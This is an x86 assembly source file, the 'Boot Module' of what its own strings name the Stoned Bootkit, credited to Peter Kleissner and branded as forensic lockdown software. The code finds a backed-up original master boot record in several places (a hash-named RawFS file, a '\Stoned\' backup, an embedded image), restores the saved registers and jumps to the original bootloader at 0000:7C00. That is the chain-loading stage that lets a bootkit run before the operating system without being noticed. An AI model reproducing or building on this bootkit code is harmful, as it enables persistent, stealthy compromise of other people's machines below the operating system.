; ******************************************************

;       Name: Boot Module
;       Author: Peter Kleissner
;       Version: 0.1
;       Date: 17.02.2008 17:11:31
;       last Update: 17.02.2008 17:11:33

;       Forensic Lockdown Software
;       (C) 2008 Vienna Computer Products

; ******************************************************

[bits 16]                                       ; create a 16 Bit Code
CPU 386                                         ; Assemble instructions up to the 386 instruction set

%include "Module Functions.asm"
%include "Kernel Storage.asm"

org Boot_Module


; export functions

jmp word Load_Original_Bootloader                     ; call this first
jmp word Execute_7C00h_Bootloader_Image               ; and then this




Load_Original_Bootloader:

; pre loads original bootloader

; 1. RawFS \Master Boot Record.bak (MD5)
; 2. Previous \Stoned\Master Boot Record.bak
; 3. Embedded backup
; 4. First hard disk bootloader or partition bootloader (whichever is available)
; 5. otherwise int 18h

%ifdef _DEBUG
mov eax,Debug_Message_Boot
call API_Debug_Message
%endif

; 1. RawFS bootloader backup
call Load_MBR_Backup_File_RawFS
%ifdef _DEBUG
mov eax,Debug_Message_RawFS
%endif
jnc Load_Original_Bootloader_Exit

; 2. Previous bootloader fs backup
call Load_MBR_Backup_File_Previous
%ifdef _DEBUG
mov eax,Debug_Message_FS_BK
%endif
jnc Load_Original_Bootloader_Exit

; 3. Embedded backup
call Load_Embedded_Bootloader_Image
%ifdef _DEBUG
mov eax,Debug_Message_EM_BK
%endif
jnc Load_Original_Bootloader_Exit

; load bootloader of the first hard disk - this is like a boot manager!
call ExecuteFirstHardDiskBootloader
%ifdef _DEBUG
mov eax,Debug_Message_FHD_BTL
%endif
jnc Load_Original_Bootloader_Exit

; otherwise return to the BIOS
%ifdef _DEBUG
mov eax,Debug_Message_NONE
call API_Debug_Message_Append
%endif
int 18h

Load_Original_Bootloader_Exit:
%ifdef _DEBUG
call API_Debug_Message_Append
%endif

ret






Execute_7C00h_Bootloader_Image:

%ifdef _DEBUG
mov eax,Debug_Message_Exit
call API_Debug_Message

xor ah,ah
int 16h
%endif

; dl = boot drive
mov dl,[PreLoadDrive]

; load context
mov esp,[Boot_Stack_Pointer]
mov [esp + 5*4],dl                                                              ; patch in the boot drive
popad

; execute the original Bootloader Image
jmp word 0000h:7C00h






%include "Pre Load Boot.asm"



PreLoadDrive            db      0
File_MBR_Backup         db      "?:\Stoned\Master Boot Record.bak", 0           ; previous backup in the Stoned Bootkit
File_MBR_Backup_RawFS   db      "?:\0F13C73AAB0D4E000028038C99D3125A", 0        ; MD5 of \Master Boot Record.bak


%ifdef _DEBUG

Debug_Message_Boot                      db "Booting from ", 0
Debug_Message_RawFS                     db "RawFS backup", 0
Debug_Message_FS_BK                     db "previous file system backup", 0
Debug_Message_EM_BK                     db "embedded backup", 0
Debug_Message_FHD_BTL                   db "first hard disk bootloader", 0
Debug_Message_NONE                      db "no bootable device found", 0
Debug_Message_Exit                      db "Press a key to pass control to bootloader", 0

%endif

; int 13h variables
Disk_Address_Packet_Size      db  10h   ; +00h
Disk_Address_Packet_Reserved  db  0     ; +01h
Disk_Address_Packet_Count     dw  1     ; +02h
Disk_Address_Packet_Buffer    dd  7C00h ; +04h
Disk_Address_Packet_LBA_Low   dd  0     ; +08h
Disk_Address_Packet_LBA_High  dd  0     ; +0Ch

